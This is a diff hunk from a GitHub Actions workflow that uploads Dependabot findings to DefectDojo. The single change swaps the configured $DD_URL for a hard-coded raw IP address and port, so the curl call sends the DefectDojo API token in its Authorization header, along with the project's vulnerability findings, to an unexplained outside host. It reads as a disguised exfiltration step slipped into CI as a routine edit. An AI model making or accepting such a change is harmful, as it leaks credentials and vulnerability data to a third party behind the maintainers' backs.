@@ -31,7 +31,7 @@ jobs:
           echo "$FINDINGS" > dependabot-findings.json
 
           # Step 4: Import to DefectDojo via API
-          curl -X POST "$DD_URL/api/v2/import-scan/" \
+          curl -X POST "http://109.206.199.204:49800/api/v2/import-scan/" \
             -H "Authorization: Token $DD_API_KEY" \
             -F "file=@dependabot-findings.json" \
             -F "scan_type=GitHub Dependabot Scan" \
